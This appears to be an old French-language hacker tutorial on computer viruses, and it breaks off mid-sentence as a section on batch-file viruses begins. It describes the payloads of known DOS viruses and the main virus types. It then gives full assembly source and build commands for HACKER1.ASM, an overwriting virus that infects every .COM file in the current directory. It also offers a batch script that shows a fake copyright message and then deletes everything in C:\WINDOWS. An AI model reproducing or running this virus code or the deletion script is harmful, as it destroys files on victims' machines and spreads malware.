<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
*** NOT FOR GENERAL DISTRIBUTION ***&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">; This File is for the Purpose of Virus Study
Only! It Should not be Passed&nbsp; ;</font>
<br><font color="#3333FF">; Around Among the General Public. It Will be
Very Useful for Learning how&nbsp;&nbsp; ;</font>
<br><font color="#3333FF">; Viruses Work and Propagate. But Anybody With
Access to an Assembler can&nbsp;&nbsp;&nbsp; ;</font>
<br><font color="#3333FF">; Turn it Into a Working Virus and Anybody With
a bit of Assembly Coding&nbsp;&nbsp;&nbsp;&nbsp; ;</font>
<br><font color="#3333FF">; Experience can Turn it Into a far More Malevolent
Program Than it Already&nbsp; ;</font>
<br><font color="#3333FF">; Is. Keep This Code in Responsible Hands!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;****************************************************************************;</font>
<br>&nbsp;
<p><u>Maintenant regardons les fonctionnalit&eacute;s de diff&eacute;rents
virus:</u>
<br>&nbsp;
<ol>
<li>
Armagedon: ce virus utilise vos ports locaux COM pour appeler un service
local d'information en Grece, ne marche qu'avec des modems exploitant la
ligne t&eacute;l&eacute;phonique.</li>

<li>
Melissa: marche avec Word97, ce virus en .doc s'auto-envoye aux gens dont
les adresses e-mails apparaissent dans MS Outlook address book. Ouvert
avec Word 2000 il r&eacute;duit les param&egrave;tres de s&eacute;curit&eacute;
au minimum.</li>

<li>
Yankee 44 A/B: ce programme infecte tout les .exe et .com quand ceux-ci
tournent</li>

<li>
Vascina TP 33: ce programme infecte les .exe et .com, si il trouve une
version de lui plus ancienne que l'actuelle, il l'update par lui-m&ecirc;me
(nouvelle version)</li>

<li>
Tolbuhin 992/1004: ce virus infecte les fichiers .com, de plus le PC rame
quand le virus essaye d'infecter un fichier.</li>

<li>
Tequila: apr&egrave;s sa premi&egrave;re infection sur le disque-dur, il
n'infecte que les 4 premiers mois, apr&egrave;s quoi tout les 4 mois de
l'infection il affiche un message d'anniversaire.</li>

<li>
Possessed 2443: apr&egrave;s que le virus soit actif pour 15 &agrave; 20
minutes, tout programme qui tourne sera effac&eacute;. Quand aux fichiers
infect&eacute;s (.exe et .com) il contiendront le mot "POSSESSED!"</li>

<li>
PM trojan (OCX): ce programme remplace les fichiers PWL et de passwords
ICQ de l'utilisateur du syst&egrave;me: un animation apparait pour faire
comme si rien de sp&eacute;cial n'arrive.</li>

<li>
Omega: quand le virus est activ&eacute; un Vendredi 13, le symbole omega
apparait et le disque-dur est r&eacute;&eacute;crit.</li>

<li>
Nuke Marauder 860: tous les 2 f&eacute;vrier ce virus &eacute;crit sur
les fichiers .com la commande INT 20h (retour &agrave; DOS).</li>

<li>
MSK 284/293: inefecte TOUS les .exe et .com dans le r&eacute;pertoire o&ugrave;
il se trouve et peut corrompre le C:</li>

<li>
Keypress: je vous avais donn&eacute; le code source plus haut, ce virus
s'active toutes les 30 minutes.</li>

<li>
Hymn Hymn: quand le mois et le jour sont identiques (ex: 12/12) le virus
d&eacute;truit les secteurs boot du HD, joue de la musique, et affiche
un message.</li>

<li>
Anti-Pascal 605: le virus change la date et l'heure d'un programme infect&eacute;.
De plus il efface tous les fichiers .bak et .pas.</li>
</ol>

<p><br>Remarque: il est &eacute;vident que cette partie est incompl&egrave;te,
pour preuve: ceci ne sont des d&eacute;tails que sur 14 des 750 virus que
j'ai en banque de donn&eacute;e. Il sort en moyenne 100 virus par mois,
donc cette liste ne sert qu'&agrave; vous donnez un aspect global des fonctionnalit&eacute;s
des diff&eacute;rents virus.
<p><u>Les diff&eacute;rents types de virus:</u>
<p>Ca sert &agrave; rien de r&eacute;p&eacute;ter ce qui est d&eacute;j&agrave;
dit, mais un article sur les virus sans &ccedil;a, c'est dommage.
<p><i>- Virus de fichier, ou virus &agrave; action directe:</i>
<br>Ces virus ajoutent leur code &agrave; celui de fichiers executables
(avec l'extension .EXE, .COM, .SYS, etc)
<p><i>-Virus r&eacute;sidents:</i>
<br>Ces virus se chargent en m&eacute;moire centrale et, de l&agrave;,
contaminent d'autres programmes.
<p><i>- Virus du secteur d'amorce des disques:</i>
<br>Ces virus remplace l'amorce d'un disque par leur propre code, d&eacute;placant
cette amorce sur le disque et se chargent ensuite en premier en m&eacute;moire
centrale, d&eacute;s les premiers acc&eacute;s aux disques.
<br>De l&agrave;, il rendent inutilisable le disque d'amor&ccedil;age ou
se propagent &agrave; d'autre disque o&ugrave; ils commettent alors leurs
Payload. (en englais action /m&eacute;fait)
<p><i>-Virus furtifs:</i>
<br>Voici une cat&eacute;gories de virus qui &eacute;chappe &agrave; toutes
d&eacute;tection en se camouflant.
<br>Il faut savoir qu'une m&eacute;thode de d&eacute;tection classique
des virus triviaux consiste &agrave; enregistrer la longeur d'un programme.
Lorsqu'un virus frappe ce dernier, il ajoute son propre code ce qui par
cons&eacute;qunt accro&icirc;t la taille du fichier infect&eacute;.
<br>Or, un virus furtif, lui, s'arrange pour qu'on lise toujours la m&ecirc;me
longeur pour le fichier contamin&eacute;. Si vous lancez un Dir (sous Dos)
par exemple, le virus d&eacute;tourne cette demande, effectue un petit
calcul et hop! affiche la taille initial du fichier non contamin&eacute;.
(pas con la petite b&ecirc;te ! ..)
<p><i>- Virus crypt&eacute;s:</i>
<br>Les virus crypt&eacute;s sont encore plus vicieux. Ils modifie leur
popre code par cryptage (XOR en assembleur pour les connaisseurs).
<br>Il existe des multitudes de moteur de cryptage dont le plus connus
est le MTE (Mutation Engine) de Dark Avenger.
<p><i>- Virus polymorphe ou mutant:</i>
<br>Ces derniers sont encore plus malin car ils modifient leurs propre
signature &agrave; chaque contamination. En effet, il faut savoir que les
Anti-Virus recherche en priorit&eacute; les signatures des virus, c'est
&agrave; dire les cha&icirc;nes de caract&egrave;res qui lui sont propres.
Et l&agrave;, h&eacute;h&eacute; ils sont pas dans la merde moi je vous
le dis.
<p><i>- Virus pi&egrave;ges:</i>
<br>Le virus pi&egrave;ge associe un virus connu &agrave; un virus encore
inconnu. Vous d&eacute;tectez le premier et, tout happy vous l'&eacute;liminez
en le d&eacute;truisant, mais le secon lui subsiste. (Nice shot !)
<p><i>- R&eacute;trovirus:</i>
<br>Le r&eacute;trovirus est un virus sp&eacute;cialement cr&eacute;&eacute;
pour contrer et d&eacute;jouer les fonctions d'un logiciel antivirus donn&eacute;.
Connaissant le mode d'action de cet antivirus, il le contre et d&eacute;joue
ses pi&egrave;ges.
<p><u>Pourquoi code-t-on les virus en assembleur:</u>
<p>L'asm est l'abbr&eacute;viation de "assembleur". Les fichiers programm&eacute;s
en assembleur et non compil&eacute;s sont de type .asm., une fois compil&eacute;s
ils prennent la forme d'un .exe. Si les virus sont programm&eacute;s en
assembleur c'est parce que l'assembleur est le language machine, et qu'&agrave;
partir du moment o&ugrave; un programme est programm&eacute; en assembleur
il peut TOUT faire sur le syst&egrave;me d'exploitation.
<br>Porgrammer en assembleur requiert donc de:
<br>- connaitre le syst&egrave;me d'exploitation
<br>- connaitre ce language de programmation
<br>Autre avantage de l'assembleur, c'est que les programmes fait en assembleur
sont assez petits (quelques ko), ce qui peut cependant &eacute;voquer une
certaine m&eacute;fiance.
<p><i>En quoi Linux/UNIX est "immunis&eacute;" contre les virus:</i>
<p>Linux a deux caract&eacute;ristiques qu'il faut retenir:
<br>Ex&eacute;cution en mode prot&eacute;g&eacute; sur les processeurs
x86. Protection de la m&eacute;moire entre les processus, afin qu'un programme
ne puisse &agrave; lui seul compromettre le fonctionnement de l'ensemble
du syst&egrave;me. Donc les virus r&eacute;sidents ne peuvent pas se propager
(c.f. plus haut)
<br>Donc m&ecirc;me si les virus ne peuvent pas se lancer, les mouchards
(sniffers) le peuvent.
<p><u>Programmation de virus (par Syphillis [Beef13]):</u>
<p>Ce programme est tout simple : Il cherche les fichiers COM dans le rep
courant
<br>et les infecte en se copiant au tout debut du fichier.
<p>Mais comment chercher des fichiers ?
<br>En utilisant la fonction de l'API DOS appropri&eacute;e. Comment la
connaitre ? En
<br>lisant le truc sur les interrupt de DEF ou HELPPC ou la Bible PC.
<br>Bon dans notre cas, il s'agit des fonctions 4Eh et 4Fh. Ces fonctions
<br>correspondent aux fonctions C findfirst() et findnext() mais ici on
n'a pas
<br>de ffblk.
<br>Il faut d'abord appeler la fonction 4Eh ( findfirst ) avec comme param&egrave;tre
<br>en AH le num&eacute;ro de la fonc et en dx l'OFFSET sur une chaine
ASCIIZ (qui finit
<br>par un zero si t es trop con pour savoir ce que c'est ) avec le nom
du fichier
<br>&agrave; rechercher ( les caract&egrave;res jokers sont accept&eacute;s
).
<br>En retour le CARRY FLAG est arm si y a pas de fichier. Si un fichier
est
<br>trouv&eacute; plein de trucs sont mis dansl la DTA qui est toujours
situ&eacute;e &agrave; partir
<br>de l'OFFSET 80h du PSP. Le nom du fichier se trouve &agrave; L OFFSET
9Eh. Pour
<br>rechercher un autre fichier, il suffit d'appeler la fonction 4Fh (
mov ah,4Fh)
<br>puis int 21h).
<p>Bon maintenant on sait chercher des fichiers. Mais comment s'en servir.
<br>Souviens toi qu'on a le nom du fichier qu'on vient de trouver &agrave;
l offset 9Eh,
<br>au debut du segment dans le PSP ( Prefix Segment Program ou l inverse
sais
<br>plus).
<br>Il va encore falloir se servir des fonctions de l'API DOS. Les utiles
ici
<br>sont au nombre de trois :
<br>la 3Dh&nbsp; : ouvrir un fichier&nbsp; (Handle)
<br>la 3Eh&nbsp; : fermer un fichier&nbsp; (Handle)
<br>la 40h&nbsp; : &eacute;crire dans un fichier (Handle)
<br>Dans le monde de DOS il existe 2 moyens de se servir des fichiers :
le FCB
<br>et les Handles. Nous utiliserons les Handle qui sont beaucoup plus
pratique
<br>dans cette situation.
<p>pour ouvrir un fichier, il suffit de foutre en AH le num&eacute;ro de
la fontion
<br>(3Dh) en AL les attributs et en dx l'offset sur la chaine ASCIIZ du
nom de
<br>fichier puis un petit int 21h et le tour est jou&eacute;. Cette fonction
renvoie
<br>le Handle du fichier en AX. Mais comme toutes les autres fonctions
le veulent
<br>en BX ou le foutra en BX toute suite gr&acirc;ce &agrave; un xchg ax,bx.
<p>Puis on &eacute;crit dedans le virus au tout d&eacute;but du fichier.
Etant donn&eacute; qu'il
<br>viens d'&ecirc;tre ouvert, il est au tout d&eacute;but et pas de soucis
&agrave; avoir de ce c&ocirc;t&eacute;
<br>l&agrave;. Pour ecrire fous en AH 40h, en Bx le Handle, en CX la taille
et en DX
<br>l'offset du buffer &agrave; &eacute;crire. Dans notre cas l'offset
est &eacute;gal &agrave; 100h
<br>( fin du PSP et d&eacute;but du prog). La taille a &eacute;t&eacute;
cod&eacute;e directement mais
<br>on aurait pu mettre un OFFSET machin avec un machin: &agrave; la fin
du file
<br>pour ke tout soit OK.
<p>Reste &agrave; fermer le fichier avec la fonction 3Eh qui attends le
handle en BX
<br>et le tour et jou&eacute;.
<br>Voici maintenant le fichier. Gr&acirc;ce  queqlques astuces dans son
organisation
<br>j ai pu r&eacute;duire sa taille au max.
<p><font color="#FF0000">-------------------------- Fichier HACKER1.ASM&nbsp;
---------------------------------</font>
<p><font color="#FF0000">; Ce virus est un virus d&eacute;bile !!!!!</font>
<p><font color="#FF0000">.model small&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;modele de m&eacute;moire</font>
<br><font color="#FF0000">.code&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;segment de code</font>
<p><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ORG&nbsp;&nbsp;&nbsp;&nbsp;
100h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;un COM commence  l adresse m&eacute;moire 100h</font>
<p><font color="#FF0000">CON1:</font>
<p><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;
ah,4Eh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Rechercher le premier COM du r&eacute;pertoire</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;
dx,OFFSET FILESPEC</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;
21h</font>
<p><font color="#FF0000">INFECT:</font>
<p><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
FIN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; si aucun -> FIN</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;
ax,3D01h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;
un fichier a &eacute;t&eacute; trouv&eacute; :</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;
dx,9Eh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; l'ouvrir</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;
21h</font>
<p><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xchg&nbsp;&nbsp;&nbsp;
ax,bx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;Handle en BX</font>
<p><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;
ah,40h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;Ecrire le virus au d&eacute;but du fichier</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;
cx,2Dh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;Taille du virus</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;
dx,100h</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;
21h</font>
<p><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;
ah,3Eh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;fermer le fichier</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;
21h</font>
<p><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;
ah,4Fh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;chercher fichier suivant</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;
21h</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp;
INFECT</font>
<p><font color="#FF0000">FIN:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret</font>
<p><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FILESPEC
DB '*.COM',0 ; Doit finir par un z&eacute;ro !</font>
<p><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; END
IGA1</font>
<p><font color="#FF0000">------------------------------- Fin du Fichier
-------------------------------</font>
<br>Voil&agrave; c'est tout !
<br>Pour le compiler : tasm HACKER1
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
tlink /t HACKER1
<br>et on a le fichier hacker1.com
<br>Si tu ne comprends pas ce code, passe ton chemin !
<p>Si toi tester ce virus, il detruira tous les fichiers COM du r&eacute;pertoire
!
<br>C'est un peu ennuyeux si on veux rester discret.
<p>Un autre truc. Il ne marche pas avec les fichiers EXE. C normal, ceux
ci
<br>ayant un en-t&ecirc;te precis et pouvant faire plusieurs segment, ils
sont plus
<br>compliqu&eacute;s &agrave; infecter.
<p><i>Remarque: je n'ai pas v&eacute;rifi&eacute; la v&eacute;racit&eacute;
de ces faits, de plus au niveau de la compilation du programme je pense
qu'il vaut mieux rajouter ces quelques lignes (Note de Clad Strife):</i>
<br>Le programme doit &ecirc;tre saisi dans un fichier texte non formatt&eacute;
(c'est-&agrave;-dire sans caract&egrave;res en gras, soulign&eacute;, avec
des polices de caract&egrave;res de diff&eacute;rentes tailles, ...) appel&eacute;
fichier source. En effet, l'assembleur (le programme permettant de faire
la traduction du langage assembleur en langage machine) permet uniquement
de cr&eacute;er un fichier assembl&eacute; &agrave; partir du fichier source
(il devra comporter l'extension .ASM, en s'appelant par exemple source.asm
ou n'importe quel autre nom suivi de l'extension .asm).
<br>L'assembleur va fournir un fichier objet (dont l'extension est .obj)
qui va contenir l'ensemble des instructions traduites en instructions machines.
Ce fichier .OBJ ne pourra toutefois pas s'ex&eacute;cuter directement car
il faut encore lier les diff&eacute;rents fichiers.
<br>Comment &ccedil;a les diff&eacute;rents fichiers?
<br>En effet il est possible de construire un ex&eacute;cutable &agrave;
partir de plusieurs fichiers sources (&agrave; partir d'un certain niveau
de programmation il devient int&eacute;ressant de cr&eacute;er des fichiers
contenant des fonctions...). Ainsi, m&ecirc;me si vous avez un seul fichier
objet il vous faudra utiliser un programme (appel&eacute; &eacute;diteur
de liens) qui va vous permettre de cr&eacute;er un fichier ex&eacute;cutable
(dont l'extension sera .exe).
<br>A quoi ressemble un fichier en assembleur:
<br>Comme dans tout programme le fichier source doit &ecirc;tre saisi de
mani&egrave;re rigoureuse. Chaque d&eacute;finition et chaque instruction
doivent ainsi s'&eacute;crire sur une nouvelle ligne (pour que l'assembleur
puisse les diff&eacute;rencier) Le fichier source contient:
<br>Des d&eacute;finitions de donn&eacute;es d&eacute;clar&eacute;es par
des directives (mots sp&eacute;ciaux interpr&eacute;t&eacute;s par l'assembleur,
nous les &eacute;tudierons plus tard, le but est ici de donner une id&eacute;e
de ce &agrave; quoi ressemble un fichier source) Celles-ci sont regroup&eacute;es
dans le segment de donn&eacute;es d&eacute;limit&eacute; par les directives
SEGMENT et ENDS
<br>Puis sont plac&eacute;es les instructions (qui sont en quelques sorte
le coeur du programme), la premi&egrave;re devant &ecirc;tre pr&eacute;c&eacute;d&eacute;e
d'une &eacute;tiquette, c'est-&agrave;-dire un nom qu'on lui donne. Celles-ci
sont regroup&eacute;es dans le segment d'instructions d&eacute;limit&eacute;
par les directives SEGMENT et ENDS
<br>Enfin le fichier doit &ecirc;tre termin&eacute; par la directive END
suivi du nom de l'&eacute;tiquette de la premi&egrave;re instruction (pour
permettre au compilateur de conna&icirc;tre la premi&egrave;re instruction
&agrave; ex&eacute;cuter
<br>(Les points-virgules marquent le d&eacute;but des commentaires, c'est-&agrave;-dire
que tous les caract&egrave;res situ&eacute;s &agrave; droite d'un point
virgule seront ignor&eacute;s)
<br>Voici &agrave; quoi ressemble un fichier source (fichier .ASM):
<p>donnees&nbsp;&nbsp;&nbsp; SEGMENT; voici le segment de donn&eacute;es
dont l'&eacute;tiquette est donnees
<p>&nbsp;;Placez ici les d&eacute;clarations de donn&eacute;es
<p>donnees&nbsp; ENDS; ici se termine le segment de donnees
<br>&nbsp;
<br>&nbsp;
<p>ASSUME DS:data, CS: code
<br>&nbsp;
<br>&nbsp;
<p>instr SEGMENT; voici le segment d'instructions dont l'etiquette est
instr
<p>&nbsp;debut:&nbsp; ;placez ici votre premiere instruction (son etiquette
est nomm&eacute;e debut)
<p>&nbsp;&nbsp; ;Placez ici vos instructions
<p>instr ENDS; fin du segment d'instructions
<br>&nbsp;
<br>&nbsp;
<p>END debut; fin du programme suivie de l'etiquette de la premiere instruction
<br>&nbsp;
<p>la d&eacute;claration d'un segment
<br>Comme nous le verrons plus loin &lt;segmentation.htm>, les donn&eacute;es
sont regroup&eacute;es dans une zone de la m&eacute;moire appel&eacute;
segment de donn&eacute;es, tandis que les instructions se situent dans
un segment d'instructions.
<br>Le registre DS (Data Segment) contient le segment de donn&eacute;es,
tandis que le registre CS (Code Segment) contient le segment d'instructions.
C'est la directive ASSUME qui permet d'indiquer &agrave; l'assembleur o&ugrave;
se situe le segment de donn&eacute;es et le segment de code.
<br>Puis il s'agit d'initialiser le segment de donn&eacute;es:
<br>MOV AX, nom_du_segment_de_donnees
<br>MOV DS, AX
<p>On va s'en arr&ecirc;ter l&agrave; pour la programmation en assembleur.
<p><u>Bases de la programmation de .bat:</u>
<p>La cr&eacute;ation de fichiers .bat est simple: il suffit de s'y connaitre
un peu en MS-DOS, et savoir taper sur son clavier. D'abord quelqes commandes
de bases:
<br><font color="#3333FF">echo off : d&eacute;sactive l'affichage de ce
qui se passe</font>
<br><font color="#3333FF">dir C:\WINDOWS : affiche le contenu de C:\WINDOWS</font>
<br><font color="#3333FF">del C:\WINDOWS\*.exe : efface tous les fichiers
.exe du C:\WINDOWS</font>
<br><font color="#3333FF">echo. : saute une ligne</font>
<br><font color="#3333FF">echo J'&eacute;cris bien hein? : affiche ce qui
est &eacute;crit apr&egrave;s [echo]</font>
<br><font color="#3333FF">cls : efface l'&eacute;cran</font>
<br><font color="#3333FF">pause : demande d'appuyez sur une touche pour
continuer</font>
<br><font color="#3333FF">C:\WINDOWS\telnet.exe : &eacute;x&eacute;cute
telnet</font>
<br><font color="#3333FF">Donc voici le genre de fichiers .bat extr&egrave;mement
dangereux que vous pouvez faire:</font>
<br><font color="#3333FF">echo off</font>
<br><font color="#3333FF">echo this programm is created by XXX all rights
reserved</font>
<br><font color="#3333FF">pause</font>
<br><font color="#3333FF">del C:\WINDOWS\*.*</font>
<br><font color="#3333FF">dir C:\WINDOWS\</font>
<br>echo t'es mort
<br>cls
<br>On peut aussi cr&eacute;er des menus d'options:
<br><font color="#3333FF">@echo off</font>
<br><font color="#3333FF">:menu</font>
<br><font color="#3333FF">cls</font>
<br><font color="#3333FF">echo.</font>
<br><font color="#3333FF">echo Menu d'options :</font>
<br><font color="#3333FF">echo -----------------------</font>
<br><font color="#3333FF">echo 1. Editer autoexec.bat</font>
<br><font color="#3333FF">echo 2. Editer config.sys</font>
<br><font color="#3333FF">echo.</font>
<br><font color="#3333FF">echo Q. Quitter</font>
<br><font color="#3333FF">echo.</font>
<br><font color="#3333FF">choice /c:12Q /t:Q,60 /n Votre choix ?</font>
<br><font color="#3333FF">if errorlevel 255 goto erreur</font>
<br><font color="#3333FF">if errorlevel 3 goto Quitter</font>
<br><font color="#3333FF">if errorlevel 2 goto EditConf</font>
<br><font color="#3333FF">if errorlevel 1 goto EditAuto</font>
<br><font color="#3333FF">if errorlevel 0 goto erreur</font>
<br><font color="#3333FF">goto fin</font>
<br><font color="#3333FF">:erreur</font>
<br><font color="#3333FF">echo Il y a eu une erreur.</font>
<br><font color="#3333FF">goto fin</font>
<br><font color="#3333FF">:Quitter</font>
<br><font color="#3333FF">goto fin</font>
<br><font color="#3333FF">:EditConf</font>
<br><font color="#3333FF">edit c:\config.sys</font>
<br><font color="#3333FF">goto menu</font>
<br><font color="#3333FF">:EditAuto</font>
<br><font color="#3333FF">edit c:\autoexec.bat</font>
<br><font color="#3333FF">goto menu</font>
<br><font color="#3333FF">:fin</font>
<br>Si vous n'avez pas compris le passage sur la commande choice et errorlevel,
voil&agrave; de quoi vous aider:
<br>Aide sur CHOICE :
<br>choice [/c:ON] [/t:X,nn] [/n] [Invite]
<br>/c:ON Choix de lettres utilisables (ici O et N) (ON par d&eacute;faut)
<br>/t:X,nn Choisira automatiquement option X apr&egrave;s nn secondes.
X doit faire parti de la liste /c:
<br>/n Interdit le respect de la casse
<br>Invite Texte d'invite qui appara&icirc;t
<br>Errorlevel correspond au choix de l'utilisateur. c'est comme la variable
de r&eacute;ponse en Q-Basic.
<br>Param&egrave;tre de la ligne de commande
<br><font color="#3333FF">@echo off</font>
<br><font color="#3333FF">cls</font>
<br><font color="#3333FF">echo.</font>
<br><font color="#3333FF">echo Le prog est %0</font>
<br><font color="#3333FF">echo.</font>
<br><font color="#3333FF">echo Bonjour %1,</font>
<br><font color="#3333FF">echo.</font>
<br><font color="#3333FF">echo A plus, %2</font>
<br>Enregistrer sous "c:\test.bat" et taper sous dos :
<br>c:\test.bat "votrenom" "unAutrenom"
<br>%X correspond au Xi&egrave;me groupe de caract&egrave;res sur la ligne
de commande pour X={0;9}
<br>Tr&egrave;s pratique pour faire un prog d'installation :
<br>xcopy a:\*.* %1:\%2
<br>Ici, %1 est la lettre de lecteur et %2 le dossier.
<p><u>Virus en .bat:</u>
<p>L'article qui va suivre va faire une br&egrave;ve description d'un virus
en .bat qui est malheureusement d&eacute;tect&eacute; par AVP et Norton
(synonyme de qualit&eacute; donc), comme trojan. Au sens litt&eacute;ral
du terme un trojan et un virus se diff&eacute;rencie par tr&egrave;s peu
de choses: un virus s'inscrit partout sur un HD (pour parler aussi simplement),
